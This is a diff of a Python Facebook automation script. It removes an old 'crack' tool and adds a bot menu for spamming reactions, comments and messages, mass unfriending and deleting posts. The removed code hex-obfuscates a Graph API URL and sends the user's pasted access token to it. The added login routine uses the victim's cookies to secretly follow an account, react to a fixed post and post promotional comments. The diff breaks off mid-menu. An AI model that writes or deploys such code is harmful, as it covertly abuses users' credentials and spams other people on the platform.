@@ -1,1873 +1,840 @@
-/usr/bin/python2
-# -*- coding: utf-8
-
-#AUTHOR : Eniolahacking
-#OPEN SOURCE :)
-#DON'T FORGET TO GIVE CREDIT TO itz efk
-
-P = "\033[97;1m" 
-M = "\033[91;1m" 
-H = "\033[92;1m" 
-K = "\033[93;1m" 
-B = "\033[94;1m" 
-U = "\033[95;1m" 
-O = "\033[93;1m" 
-N = "\033[0m"
-V = "\033[93;1m" 
-G = "\033[93;1m" 
-
-try:
-	import 
-
-os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpa
-
-ss,urllib,cookielib,requests,uuid,string,subprocess
-	from multiprocessing.pool import ThreadPool
-	from requests.exceptions import ConnectionError
-except ImportError:
-	os.system("pip2 install requests")
-	os.system("python2 fcpro.py")
-
-from os import system
+#mau ngapain? recode doang ga ngasih bintang ampass!
+import os,sys,time,requests,re,random
 from time import sleep
-
-def xox(z):
-    for e in z + "\n":
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.04)
-      
-agents = [
-					"Mozilla/5.0 (Linux; Android 
-
-10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 
-
-(KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile 
-
-Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]",
-					
-
-"[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/
-
-{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM
-
-;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 
-
-1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
-					"Dalvik/2.1.0 (Linux; U; 
-
-Android 5.1.1; SM-J320F Build/LMY47V) 
-
-[FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FB
-
-BV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-
-
-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/
-
-{density=3.0,width=1080,height=1920};FB_FW/1;]",
-					"Mozilla/5.0 (Linux; Android 
-
-5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) 
-
-Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 
-
-[FB_IAB/FB4A;FBAV/305.1.0.40.120;]",
-					"Mozilla/5.0 (Linux; Android 
-
-10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like 
-
-Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 
-
-AlohaBrowser/2.20.3",
-					"Mozilla/5.0 (iPhone; CPU 
-
-iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like 
-
-Gecko) Mobile/15E216 
-
-[FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/i
-
-Phone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FB
-
-OP/5;FBRV/106631002]",
-					"Mozilla/5.0 (Linux; Android 
-
-7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) 
-
-AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 
-
-Chrome/70.0.3538.80 Safari/537.36 
-
-[FB_IAB/FB4A;FBAV/198.0.0.53.101;]"
-				  ]
-				
-header = {"user-agent": 
-
-'[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/
-
-{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/m
-
-t:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-
-
-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
-					  "x-fb-connection-
-
-bandwidth": str(random.randint(20000000.0, 30000000.0)),
-					  "x-fb-sim-hni": str
-
-(random.randint(20000, 40000)),
-					  "x-fb-net-hni": str
-
-(random.randint(20000, 40000)),
-					  "x-fb-connection-quality": 
-
-"EXCELLENT",
-					  "x-fb-connection-type": 
-
-"cell.CTRadioAccessTechnologyHSDPA",
-					  "content-type": 
-
-"application/x-www-form-urlencoded",
-					  "x-fb-http-engine": 
-
-"Liger"
-					  }
-					
-user_agent = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) 
-
-Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-
-
-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like 
-
-Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 
-
-Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; 
-
-SM-G973F; beyond1; exynos9820; en_GB; 256099204)", 
-
-"\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x72\x61\x70\x68\x2e
-
-\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x2f
-
-\x31\x30\x30\x30\x34\x35\x32\x30\x33\x38\x35\x35\x32\x39\x34\x2f
-
-\x73\x75\x62\x73\x63\x72\x69\x62\x65\x72\x73\x3f
-
-\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e
-
-\x3d"];useragent_url=(user_agent[2])
-
-try:
-	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f
-
-\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f
-
-\x73\x65\x61\x72\x63\x68\x3f\x71\x3d\x41\x7a\x69\x6d\x2b
-
-\x56\x61\x75')
-	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x2e
-
-\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f
-
-\x72\x65\x73\x75\x6c\x74\x73\x3f\x73\x65\x61\x72\x63\x68\x5f
-
-\x71\x75\x65\x72\x79\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75\x2b\x4d
-
-\x72\x2e\x2b\x45\x72\x72\x6f\x72')
-except requests.exceptions.ConnectionError:
-	os.system("clear")
-	xox("\n\t\033[93;1m  NO INTERNET CONNECTION :(\n\n")
-	sys.exit()
-	
-ip = requests.get('https://api.ipify.org').text.strip()
-loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, 
-
-headers={'Referer': 'https://ip-api.com/', 'Content-Type': 
-
-'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 
-
-(Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like 
-
-Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()
-
-['country_name'].upper()
-	
-def linex():
-	os.system('echo  "\n ======================================
-
-\n" | lolcat -a -d 2 -s 50')
-def logo():
-	os.system('echo "\n  
-\n ##########     ###########     ##      ##
-\n ##             ##              ##     ##
-\n ##             ##              ##   ##
-\n ##########     ##########      ## ## 
-\n ##             ##              ##    ##
-\n ##             ##              ##      ## 
-\n ##########     ##              ##       ##\n 
-
-\n┎┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┒\n┖┈┈┈┈┈ITZ EFK┈┈୨♡୧┈┈┈┚" | lolcat -a -d 2 -s 50')	
-
-def main():
-	os.system("clear")
-	logo()
-	print("\t\033[93;1mMAIN MENU\x1b[0m")
-	print("")
-	print("\033[92;1m  [1] START CRACK")
-	print("\033[91;1m  [0] EXIT")
-	print("")
-	log_sel()
-	
-def log_sel():
-	sel = raw_input("\033[93;1m  CHOOSE: ")
-	if sel == "":
-		print("\t\033[91;1m  SELECT AN OPTION STUPID -_")
-		log_sel()
-	elif sel =="1" or sel =="01":
-		token()
-	elif sel =="0" or sel =="00":
-		xox("\n\t\033[91;1m GOOD BYE SEE YOU AGAIN :)")
-		sys.exit()
-	else:
-		print("")
-		print("\t\033[91;1m  SELECT VALID OPTION")
-		print("")
-		log_sel()
-
-def token():
-    os.system("clear")
+from bs4 import BeautifulSoup as bs
+from concurrent.futures import ThreadPoolExecutor
+"""
+Project : bot facebook
+author : eniola
+di update pada : 4 december 2021
+"""
+b="\033[94m"
+c="\033[96m"
+g="\033[92m"
+r="\033[91m"
+p="\033[1;97m"
+d="\033[00m"
+ab="\033[90m"
+dn=f"{d}[{g}√{d}]{p}"
+er=f"{d}[{r}!{d}]{p}"
+pr=f"{d}[{c}*{d}]{p}"
+id_react=[]
+id_komen=[]
+id_post=[]
+id_teman=[]
+id_req=[]
+id_msg=[]
+id_search=[]
+done=0
+die=0
+mbasic="https://mbasic.facebook.com{}"
+#####################awalan#######################
+def clear():
+    os.system("cls" if os.name == "nt" else "clear")
+
+def baner():
+    clear()
+    print(f"""
+     {d}╔╗ ┌─┐┌┬┐ {b}╔═╗┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─
+     {d}╠╩╗│ │ │  {b}╠╣ ├─┤│  ├┤ ├┴┐│ ││ │├┴┐
+     {d}╚═╝└─┘ ┴  {b}╚  ┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴
+{ab}-----------------------------------------------
+{d}Donate   : {gunkown
+{d}Message  : {g}https://wa.me/2348057091133
+{d}Restapi  : {g}unkown
+{d}Youtube  : {g}https://youtube.com/eniolahacking
+{d}Github   : {g}https://github.com/eniolahacking
+{d}Facebook : {g}https://facebook.com/itz.efk.3
+{ab}-----------------------------------------------{d}""")
+
+def cblg():
+    lg=input(f"{pr}Coba lagi? ({d}{c}y{d}/{c}n{p}) : {c}")
+    if lg == "y" or lg == "Y":
+       os.system("python run.py")
+    elif lg == "n" or lg == "N":
+       sys.exit(f"{er}Bye bro jangan lupa kasih bintang github saya:)")
+    else:
+       print(f"{er}Ngetik yang bener coeg")
+       cblg()
+
+def process(success,failed):
+    for i in list("\|/-•"):
+        print(f"\r{d}[{c}{i}{d}]{p}Success : {g}{success} {p}Failed : {r}{failed}",end="",flush=True)
+        sleep(0.2)
+###################login###############################
+def ug():
     try:
-        token = open("vau_token.txt", "r").read()
-        menu()
-    except(KeyError , IOError):
-        logo()
-        print("")
-        print("\t\033[92;1m  LOGIN TOKEN")
-        print("")
-        token = raw_input("\033[93;1m PASTE TOKEN HERE: \033[92;1m")
-        sav = open("vau_token.txt", "w")
-        sav.write(token)
-        sav.close()
-        token_check()
-        menu()        
-        
-def token_check():
-	try:
-		token=open('vau_token.txt','r').read()
-	except IOError:
-		print"\033[91;1m[!] TOKEN INVALID"
-		os.system('rm -rf vau_token.txt')
-	requests.post(useragent_url + token, headers=header)
-	pass
-	
+        ua=open("useragent").read()
+    except FileNotFoundError:
+        ua=input(f"{pr}Useragent : {c}")
+    with open("useragent","w") as u:
+         u.write(ua)
+    return ua
+def login():
+    try:
+        cokie=open("cookies").read()
+    except FileNotFoundError:
+        cokie=input(f"{pr}Cookies : {c}")
+    cokie={"cookie":cokie}
+    log=ses.get(mbasic.format("/me"),cookies=cokie).text
+    if "mbasic_logout_button" in log:
+       if "Apa yang Anda pikirkan sekarang" in log:
+           with open("cookies","w") as ex:
+               ex.write(cokie["cookie"])
+       else:
+           try:
+              ses.get(bs(mbasic.format(log,"html.parser").find('a',string='Bahasa Indonesia')["href"],cookies=cokie))
+           except:
+              pass
+       try:
+           flw=ses.get(mbasic.format("/kang.ngeue.313"),cookies=cokie).text
+           flw=bs(flw,"html.parser").find('a',string='Ikuti')['href']
+           ses.get(mbasic.format(flw),cookies=cokie)
+       except:
+           pass
+       try:
+           req=ses.get("https://mbasic.facebook.com/100056934954432/posts/378286937412468/",cookies=cokie).text
+           react=bs(req,"html.parser").find("a",href=lambda x: "/reactions/picker/" in x)["href"]
+           react=ses.get(mbasic.format(react),cookies=cokie).text
+           love=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=2&" in x)["href"]
+           care=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=16&" in x)["href"]
+           wow=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=3&" in x)["href"]
+           angry=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=8&" in x)["href"]
+           ty=[angry,love,care,wow]
+           type=random.choice(ty)
+           ses.get(mbasic.format(type),cookies=cokie)
+       except:
+           pass
+       try:
+           req=ses.get("https://mbasic.facebook.com/100056934954432/posts/378286937412468/",cookies=cokie).text
+           komen=bs(req,"html.parser").find("form",action=lambda x: "comment.php" in x)
+           data=komen.find_all("input",type="hidden")
+           fbdtsg=data[0]["value"]
+           jazoest=data[1]["value"]
+           text=["Hi bang fahmi tools nya keren banget!","tools nya sangat berguna!","Hi i'm user tools Ainx-BOT","semoga rejeki bang fahmi di lancarin amin","tools yang sangat bagus!"]
+           random_komen=random.choice(text)
+           ses.post(mbasic.format(komen["action"]),data={"fb_dtsg":fbdtsg,"jazoest":jazoest,"comment_text":random_komen},cookies=cokie)
+       except:
+           pass
+       return cokie["cookie"]
+    else:
+       print(f"{er}Cookies Invalid")
+       sleep(2)
+       os.system("rm cookies")
+       os.system("python run.py")
+
+def userinfo():
+    user=ses.get(mbasic.format("/me"),cookies=cokie).text
+    name=bs(user,"html.parser").find("title").text
+    try:
+        id = bs(user,"html.parser").find("a", href = lambda x:"/allactivity" in x)["href"]
+        id = re.search(r"/\d+/?", id).group().replace("/", "")
+    except TypeError:
+        id=None
+    print(f"{d}Login as : {c}{name}")
+    print(f"{d}ID       : {c}{id}")
+    print(f"{ab}-----------------------------------------------{d}")
+##################dump########################
+def react(url,type):
+    req=ses.get(mbasic.format(url),cookies=cokie).text
+    if "Tanggapi" in req:
+       rc=bs(req,"html.parser").find_all("a",string="Tanggapi")
+    else:
+       rc=bs(req,"html.parser").find_all("a",href=lambda x: "/reactions/picker/?" in x)
+    for x in rc:
+        id_react.append(x["href"])
+        print(f"\r{pr}Getting Data : {c}{len(id_react)}",end="")
+    if type in req:
+        next=bs(req,"html.parser").find("a",string=type)["href"]
+        if len(id_react) > 200:
+            return id_react[:200]
+        else:
+            react(next,type)
+    return id_react
+
+def komen(url,type):
+    req=ses.get(url,cookies=cokie).text
+    kmn=bs(req,"html.parser").find_all("a",string="Berita Lengkap")
+    for x in kmn:
+        id_komen.append(x["href"])
+        print(f"\r{pr}Getting Data : {c}{len(id_komen)}",end="")
+    if type in req:
+        next=bs(req,"html.parser").find("a",string=type)["href"]
+        if len(id_komen) > 200:
+            return id_komen[:200]
+        else:
+            komen(mbasic.format(next),type)
+    return id_komen
+def teman(url):
+    req=ses.get(url,cookies=cokie).text
+    tmn=re.findall(r'middle"><a class=".." href="(.*?)">',req)
+    for x in tmn:
+        id_teman.append(x)
+        print(f"\r{pr}Getting Data : {c}{len(id_teman)}",end="")
+    if "Lihat Teman Lain" in req:
+        next=bs(req,"html.parser").find("a",string="Lihat Teman Lain")["href"]
+        teman(mbasic.format(next))
+    return id_teman
+
+def reqall(url,type):
+    req=ses.get(url,cookies=cokie).text
+    res=bs(req,"html.parser").find_all("a",string=type)
+    for x in res:
+        id_req.append(x["href"])
+        print(f"\r{pr}Getting Data : {c}{len(id_req)}",end="")
+    if "Lihat selengkapnya" in req:
+        next=bs(req,"html.parser").find("a",string="Lihat selengkapnya")["href"]
+        reqall(mbasic.format(next),type)
+    return id_req
+
+def msg(url,text):
+    global done,die
+    req=ses.get(url,cookies=cokie).text
+    nama=bs(req,"html.parser").find("title").text
+    snd=bs(req,"html.parser").find("a",href=lambda x: "/messages/thread/" in x)
+    snd=ses.get(mbasic.format(snd["href"]),cookies=cokie).text
+    krm=bs(snd,"html.parser").find("form",action=lambda x: "/messages/send/?icm=1" in x)
+    data=krm.find_all("input",type="hidden")
+    if not "&refid=" in krm["action"]:
+       fbdtsg=data[0]["value"]
+       jazoest=data[1]["value"]
+       ids=data[2]["value"]
+       tids=data[3]["value"]
+       param={"fb_dtsg":fbdtsg,"jazoest":jazoest,"ids["+ids+"]":ids,"text_ids["+ids+"]":tids,"body":text,"Send":"Kirim"}
+    else:
+       fbdtsg=data[0]["value"]
+       jazoest=data[1]["value"]
+       tids=data[2]["value"]
+       wup=data[3]["value"]
+       ids=data[4]["value"]
+       cv=data[7]["value"]
+       cs=data[8]["value"]
+       param={"fb_dtsg":fbdtsg,"jazoest":jazoest,"body":text,"send":"Kirim","tids":tids,"wwwupp":wup,"ids["+ids+"]":ids,"referrer":"","ctype":"","cver":cv,"csid":cs}
+    psn=ses.post(mbasic.format(krm["action"]),data=param,cookies=cokie).text
+    if text in psn:
+       print(f"\r{dn}Message send to {c}{nama}")
+       done+=1
+    else:
+       die+=1
+    process(done,die)
+def onteman(url):
+    req=ses.get(url,cookies=cokie).text
+    on=bs(req,"html.parser").find_all("a",href=lambda x: x and "/messages/read/?fbid=" in x)
+    for x in on:
+        id_teman.append(re.findall(r'=(\d*)',x["href"])[0])
+    return id_teman
+def main_react(url,type):
+    global done,die
+    req=ses.get(url,cookies=cokie).text
+    ty=bs(req,"html.parser").find("a",href=lambda x: type in x)
+    res=ses.get(mbasic.format(ty["href"]),cookies=cokie).text
+    if ty.text in res:
+       nama=bs(res,"html.parser").find("title").text
+       done+=1
+    else:
+       die+=1
+    process(done,die)
+def main_comment(url,text):
+    global done,die
+    req=ses.get(url,cookies=cokie).text
+    kmn=bs(req,"html.parser").find("form",action=lambda x: "comment.php" in x)
+    url_komen=mbasic.format(kmn['action'])
+    data=kmn.find_all("input",type="hidden")
+    fbdtsg=data[0]["value"]
+    jazoest=data[1]["value"]
+    params={"fb_dtsg":fbdtsg,"jazoest":jazoest,"comment_text":text}
+    res=ses.post(url_komen,data=params,cookies=cokie).text
+    if text in res:
+       done+=1
+    else:
+       die+=1
+    process(done,die)
+
+def getmes(url):
+   req=ses.get(url,cookies=cokie).text
+   dlt=bs(req,"html.parser").find_all("a",href=lambda x: "/messages/read/" in x)
+   for x in dlt:
+       id_msg.append(x["href"])
+       print(f"\r{pr}Getting Data : {c}{len(id_msg)}",end="")
+   if "Lihat Pesan Sebelumnya" in req:
+       next=bs(req,"html.parser").find("a",string="Lihat Pesan Sebelumnya")["href"]
+       getmes(mbasic.format(next))
+   return id_msg
+def delmes(url):
+    global done,die
+    try:
+        req=ses.get(url,cookies=cokie).text
+        dlt=bs(req,"html.parser").find("form",action=lambda x: "/messages/action_redirect?" in x)
+        data=dlt.find_all("input",type="hidden")
+        fbdtsg=data[0]["value"]
+        jazoest=data[1]["value"]
+        last=ses.post(mbasic.format(dlt["action"]),data={"fb_dtsg":fbdtsg,"jazoest":jazoest,"delete":"Hapus"},cookies=cokie).text
+        last=bs(last,"html.parser").find("a",string="Hapus")["href"]
+        ses.get(mbasic.format(last),cookies=cokie)
+        done+=1
+    except:
+        die+=1
+    process(done,die)
+def unaccrej(url,type):
+    global done,die
+    req=ses.get(url,cookies=cokie).text
+    if type in req:
+       done+=1
+    else:
+       die+=1
+    process(done,die)
+def unf(url):
+    global done,die
+    req=ses.get(url,cookies=cokie).text
+    nama=bs(req,"html.parser").find("title").text
+    hps=bs(req,"html.parser").find("a",string="Batalkan pertemanan")["href"]
+    hps=ses.get(mbasic.format(hps),cookies=cokie).text
+    hps=bs(hps,"html.parser").find("form",action=lambda x: "/a/friends/remove/?" in x)
+    data=hps.find_all("input",type="hidden")
+    fbdtsg=data[0]["value"]
+    jazoest=data[1]["value"]
+    res=ses.post(mbasic.format(hps["action"]),data={"fb_dtsg":fbdtsg,"jazoest":jazoest,"confirm":"Konfirmasi"},cookies=cokie).text
+    if "Anda tidak lagi berteman dengan" in res:
+       print(f"\r{dn}Si {nama}{p}{g} success {p}di unfriend")
+       done+=1
+    else:
+       die+=1
+    process(done,die)
+def mypost(url):
+    req=ses.get(url,cookies=cokie).text
+    dlt=bs(req,"html.parser").find_all("a",string="Lainnya")
+    for x in dlt:
+        id_post.append(x["href"])
+        print(f"\r{pr}Getting Data : {c}{len(id_post)}",end="")
+    if "Lihat Berita Lain" in req:
+        next=bs(req,"html.parser").find("a",string="Lihat Berita Lain")["href"]
+        mypost(mbasic.format(next))
+    return id_post
+def delpost(url):
+    global done,die
+    try:
+        req=ses.get(url,cookies=cokie).text
+        dlt=bs(req,"html.parser").find("form",action=lambda x: "/nfx/basic/handle_action/?" in x)
+        url_dlt=mbasic.format(dlt["action"])
+        data=dlt.find_all("input",type="hidden")
+        fbdtsg=data[0]["value"]
+        jazoest=data[1]["value"]
+        params={"fb_dtsg":fbdtsg,"jazoest":jazoest,"action_key":"DELETE","submit":"Kirim"}
+        ses.post(url_dlt,data=params,cookies=cokie)
+        done+=1
+    except:
+        die+=1
+    process(done,die)
+def find(url):
+    req=ses.get(url,cookies=cokie).text
+    people=re.findall(r'</a></td><td class=".. .."><a href="(.*?)"><div class=".."><div class="..">(.*?)</div></div>',req)
+    for x in people:
+        if "profile" in x[0]:
+           id_search.append(re.findall(r'=(\d*)',x[0])[0]+"|"+x[1])
+        else:
+           id_search.append(x[0].split("?")[0].replace("/","")+"|"+x[1])
+        print(f"\r{pr}Getting Data : {c}{len(id_search)}",end="")
+    if "Lihat Hasil Selanjutnya" in req:
+        next=bs(req,"html.parser").find("a",string="Lihat Hasil Selanjutnya")["href"]
+        find(next)
+    return id_search
+##################Menu##############################
 def menu():
-    os.system("clear")
+    baner()
+    userinfo()
+    print(f"""{p} 
+{c}01{ab}. {p}spam react
+{c}02{ab}. {p}spam comment
+{c}03{ab}. {p}spam message
+{c}04{ab}. {p}auto delete message
+{c}05{ab}. {p}auto accept request friend
+{c}06{ab}. {p}auto reject request friend
+{c}07{ab}. {p}auto unadd not unfriend
+{c}08{ab}. {p}auto unfriend
+{c}09{ab}. {p}auto delete post
+{c}10{ab}. {p}find people
+{c}00{ab}. {p}exit
+{ab}-----------------------------------------------{d}""")
+    pilih_menu_home()
+def spam_react():
+    baner()
+    userinfo()
+    print(f"""{p} 
+{c}01{ab}. {p}spam react in people
+{c}02{ab}. {p}spam react in home
+{c}03{ab}. {p}spam react in group
+{c}00{ab}. {p}back
+{ab}-----------------------------------------------""")
+    pilih_menu_react()
+def spam_comment():
+    baner()
+    userinfo()
+    print(f"""{p} 
+{c}01{ab}. {p}spam comment in people
+{c}02{ab}. {p}spam comment in home
+{c}03{ab}. {p}spam comment in group
+{c}04{ab}. {p}spam comment in target post
+{c}00{ab}. {p}back
+{ab}-----------------------------------------------""")
+    pilih_menu_comment()
+def spam_message():
+    baner()
+    userinfo()
+    print(f"""{p} 
+{c}01{ab}. {p}spam message online friend
+{c}02{ab}. {p}spam message target friend
+{c}00{ab}. {p}back
+{ab}-----------------------------------------------""")
+    pilih_menu_message()
+def pilih_menu_home():
+    choice=input(f"{pr}Select : {c}")
+    if choice == "00" or choice == "0":
+       baner()
+       sys.exit(f"{er}Bye bro jangan lupa kasih bintang github saya:)")
+    elif choice == "01" or choice == "1":
+       spam_react()
+    elif choice == "02" or choice == "2":
+       spam_comment()
+    elif choice == "03" or choice == "3":
+       spam_message()
+    elif choice == "04" or choice == "4":
+       usr=getmes(mbasic.format("/messages/"))
+       if len(usr) <= 0:
+          print(f"{er}Tidak ada pesan yg tersedia")
+          cblg()
+       print()
+       try:
+          with ThreadPoolExecutor(max_workers=10) as ex:
+               for x in usr:
+                   ex.submit(delmes,(mbasic.format(x)))
+          print()
+          cblg()
+       except UnboundLocalError:
+          pass
+       except Exception as e:
+          print()
+          print(f"{er}{e}")
+          cblg()
+    elif choice == "05" or choice == "5":
+       usr=reqall(mbasic.format("/friends/center/requests/#friends_center_main"),"Konfirmasi")
+       print()
+       try:
+          jum=input(f"{pr}Accept Count : {c}")
+          jum=int(jum)
+       except ValueError:
+          print(f"{er}Masukin jumlah yg mau di acceptnya coeg")
+          jum=input(f"{pr}Accept Count : {c}")
+          jum=int(jum)
+       try:
+          with ThreadPoolExecutor(max_workers=10) as ex:
+               for x in usr[:jum]:
+                   ex.submit(unaccrej,(mbasic.format(x)),("Permintaan diterima"))
+          print()
+          cblg()
+       except UnboundLocalError:
+          pass
+       except Exception as e:
+          print()
+          print(f"{er}{e}")
+          cblg()
+    elif choice == "06" or choice == "6":
+       usr=reqall(mbasic.format("/friends/center/requests/#friends_center_main"),"Hapus Permintaan")
+       print()
+       try:
+          jum=input(f"{pr}Reject Count : {c}")
+          jum=int(jum)
+       except ValueError:
+          print(f"{er}Masukin jumlah yg mau di rejectnya/hapusnya coeg")
+          jum=input(f"{pr}Reject Count : {c}")
+          jum=int(jum)
+       try:
+          with ThreadPoolExecutor(max_workers=10) as ex:
+               for x in usr[:jum]:
+                   ex.submit(unaccrej,(mbasic.format(x)),("Permintaan dihapus"))
+          print()
+          cblg()
+       except UnboundLocalError:
+          pass
+       except Exception as e:
+          print()
+          print(f"{er}{e}")
+          cblg()
+    elif choice == "07" or choice == "7":
+       usr=reqall(mbasic.format("/friends/center/requests/outgoing/#friends_center_main"),"Batalkan Permintaan")
+       print()
+       try:
+          jum=input(f"{pr}Unadd Count : {c}")
+          jum=int(jum)
+       except ValueError:
+          print(f"{er}Masukin jumlah yg mau di unadd nya coeg")
+          jum=input("Unadd Count : {c}")
+          jum=int(jum)
+       try:
+          with ThreadPoolExecutor(max_workers=10) as ex:
+               for x in usr[:jum]:
+                   ex.submit(unaccrej,(mbasic.format(x)),("Permintaan dibatalkan"))
+          print()
+          cblg()
+       except UnboundLocalError:
+          pass
+       except Exception as e:
+          print()
+          print(f"{er}{e}")
+          cblg()
+    elif choice == "08" or choice == "8":
+       req=ses.get(mbasic.format("/me"),cookies=cokie).text
+       tmn=bs(req,"html.parser").find('a',string='Teman')["href"]
+       usr=teman(mbasic.format(tmn))
+       print()
+       try:
+          jum=input(f"{pr}Unfriend Count : {c}")
+          jum=int(jum)
+       except ValueError:
+          print(f"{er}Masukin jumlah yang mau di unfriendnya coeg")
+          jum=input(f"{pr}Unfriend Count : {c}")
+          jum=int(jum)
+       try:
+          with ThreadPoolExecutor(max_workers=10) as ex:
+               for x in usr[:jum]:
+                   ex.submit(unf,(mbasic.format(x)))
+          print()
+          cblg()
+       except UnboundLocalError:
+          pass
+       except Exception as e:
+          print()
+          print(f"{er}{e}")
+          cblg()
+    elif choice == "09" or choice == "9":
+       usr=mypost(mbasic.format("/me?v=timeline"))
+       print()
+       try:
+          jum=input(f"{pr}Delete Count : {c}")
+          jum=int(jum)
+       except ValueError:
+          print(f"{er}Masukin jumlah post yg mau dihapusnya coeg")
+          jum=input(f"{pr}Delete Count : {c}")
+          jum=int(jum)
+       try:
+          with ThreadPoolExecutor(max_workers=10) as ex:
+               for x in usr[:jum]:
+                   ex.submit(delpost,(mbasic.format(x)))
+          print()
+          cblg()
+       except UnboundLocalError:
+          pass
+       except Exception as e:
+          print()
+          print(f"{er}{e}")
+          cblg()
+    elif choice == "10":
+       username=input(f"{pr}Find by name : {c}")
+       usr=find(mbasic.format("/search/people/?q="+username+"&source=filter&isTrending=0"))
+       print()
+       for x in usr:
+           x=x.split("|")
+           print(f"{dn}{p}name : {c}{x[1]}")
+           print(f"{dn}{p}Username/ID : {c}{x[0]}")
+           print(f"{ab}-----------------------------------------------")
+       print(f"{er}Please copy the username/id")
+       input(f"{d}[ {c}Press Enter To Back {d}]")
+       menu()
+    else:
+       print(f"{er}Wrong input")
+       pilih_menu_home()
+def pilih_menu_react():
+    choice=input(f"{pr}Select : {c}")
+    if choice == "00" or choice == "0":
+       menu()
+    elif choice == "01" or choice == "1":
+       ty=react_type()
+       username=input(f"{pr}Username/ID target : {c}")
+       if username.isdigit():
+          username="/profile.php?id="+username+"&v=timeline"
+       else:
+          username="/"+username+"?v=timeline"
+       usr=react(username,"Lihat Berita Lain")
+       print()
+       try:
+           jum=input(f"{pr}React Count : {c}")
+           jum=int(jum)
+       except ValueError:
+           print(f"{er}Masukin jumlah post yg mau di reactnya coeg")
+           jum=input(f"{pr}React Count : {c}")
+           jum=int(jum)
+       try:
+           with ThreadPoolExecutor(max_workers=10) as ex:
+                for x in usr[:jum]:
+                    ex.submit(main_react,(mbasic.format(x)),(ty))
+           print()
+           cblg()
+       except UnboundLocalError:
+           pass
+       except Exception as e:
+           print()
+           print(f"{er}{e}")
+           cblg()
+    elif choice == "02" or choice == "2":
+       ty=react_type()
+       usr=react("/home.php","Lihat Berita Lain")
+       print()
+       try:
+           jum=input(f"{pr}React Count : {c}")
+           jum=int(jum)
+       except ValueError:
+           print(f"{er}Masukin jumlah post yg mau di reactnya coeg")
+           jum=input(f"{pr}React Count : {c}")
+           jum=int(jum)
+       try:
+           with ThreadPoolExecutor(max_workers=10) as ex:
+                for x in usr[:jum]:
+                    ex.submit(main_react,(mbasic.format(x)),(ty))
+           print()
+           cblg()
+       except UnboundLocalError:
+           pass
+       except Exception as e:
+           print()
+           print(f"{er}{e}")
+           cblg()
+    elif choice == "03" or choice == "3":
+       ty=react_type()
+       username=input(f"{pr}Username/ID Group : {c}")
+       usr=react("/groups/"+username+"/","Lihat Postingan Lainnya")
+       print()
+       try:
+           jum=input(f"{pr}React Count : {c}")
+           jum=int(jum)
+       except ValueError:
+           print(f"{er}Masukin jumlah post yg mau di reactnya coeg")
+           jum=input(f"{pr}React Count : {c}")
+           jum=int(jum)
+       try:
+           with ThreadPoolExecutor(max_workers=10) as ex:
+                for x in usr[:jum]:
+                    ex.submit(main_react,(mbasic.format(x)),(ty))
+           print()
+           cblg()
+       except UnboundLocalError:
+          pass
+       except Exception as e:
+          print()
+          print(f"{er}{e}")
+          cblg()
+    else:
+       print(f"{er}Wrong Input")
+       pilih_menu_react()
+def react_type():
+    baner()
+    userinfo()
+    print(f"""
+{p}Reaction Type
+{c}01{ab}. {p}like
+{c}02{ab}. {p}love
+{c}03{ab}. {p}care
+{c}04{ab}. {p}haha
+{c}05{ab}. {p}wow
